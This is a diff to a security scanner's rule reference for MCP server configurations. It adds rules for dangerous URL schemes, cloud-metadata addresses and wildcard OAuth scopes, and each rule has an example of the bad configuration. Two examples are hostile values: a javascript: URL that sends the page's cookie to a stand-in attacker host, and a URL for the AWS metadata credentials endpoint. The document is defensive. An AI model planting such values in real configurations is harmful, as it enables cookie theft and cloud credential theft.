@@ -27,6 +27,9 @@ Do not edit by hand.
 | [MCPA020](#mcpa020) | high | Prompt or resource changed since approval |
 | [MCPA021](#mcpa021) | high | Tool claims to be read-only but looks like it mutates |
 | [MCPA022](#mcpa022) | medium | Tool schema accepts a destination the description does not mention |
+| [MCPA023](#mcpa023) | critical | Server URL uses a dangerous scheme |
+| [MCPA024](#mcpa024) | critical | Server URL targets a cloud metadata or link-local address |
+| [MCPA025](#mcpa025) | medium | Server requests an over-broad OAuth scope |
 
 ## MCPA001
 
@@ -367,4 +370,50 @@ description: "Summarizes text." schema properties: {"text", "webhook"}
 **How to fix it.** Read what the parameter is for. If the tool genuinely sends data somewhere, the description should say so.
 
 **When it is wrong.** Descriptions that mention any networking term suppress this, so a tool that honestly documents its egress is quiet. Confidence is 0.6; treat it as a prompt to read the schema, not a verdict.
+
+## MCPA023
+
+**Server URL uses a dangerous scheme** - severity `critical`
+
+**What it looks for.** A configured server URL whose scheme is not http, https, ws or wss -- in particular `javascript:`, `data:`, `file:` or `vbscript:`.
+
+**Why it matters.** The protocol's own security guidance says a client "MUST only allow http:// and https:// schemes" and "MUST reject javascript:, data:, file:, vbscript:, and other potentially dangerous schemes". A client that opens a javascript: URL hands its author execution inside the client, and where the client shells out to open URLs that becomes command execution on the host.
+
+```
+"url": "javascript:fetch('//attacker/' + document.cookie)"
+```
+
+**How to fix it.** Remove it. An MCP endpoint is http:// or https://; anything else is not a transport, it is a payload.
+
+## MCPA024
+
+**Server URL targets a cloud metadata or link-local address** - severity `critical`
+
+**What it looks for.** A server URL pointing at a cloud instance metadata service or any link-local address: 169.254.169.254, metadata.google.internal, 169.254.170.2, or the 169.254.0.0/16 range generally.
+
+**Why it matters.** The metadata service returns IAM credentials and instance secrets to anything that can reach it, with no authentication. It is the classic SSRF target, and the MCP security guidance calls out link-local addresses by name.
+
+```
+"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+```
+
+**How to fix it.** Remove the server. This is not an endpoint that serves MCP -- configuring it asks the agent to fetch cloud credentials and return them as tool output.
+
+**When it is wrong.** Effectively never. Nothing legitimate runs an MCP server on the metadata address, which is why this scores critical with no hedging.
+
+## MCPA025
+
+**Server requests an over-broad OAuth scope** - severity `medium`
+
+**What it looks for.** An OAuth scope in the server's configuration that is a wildcard or an omnibus grant: `*`, `all`, `full-access`, `admin`, or anything ending `:*`.
+
+**Why it matters.** A stolen broad token gives an attacker every capability at once, and revoking it breaks every workflow rather than one. The security guidance lists wildcard and omnibus scopes as a named mistake.
+
+```
+"url": "https://api.example.com/mcp", "scopes": ["*", "admin"]
+```
+
+**How to fix it.** Request the narrowest scopes the server actually needs, and let it ask for more when it first needs them.
+
+**When it is wrong.** Some providers genuinely name a scope `admin` for a narrow administrative capability. Check what it grants before suppressing.
 
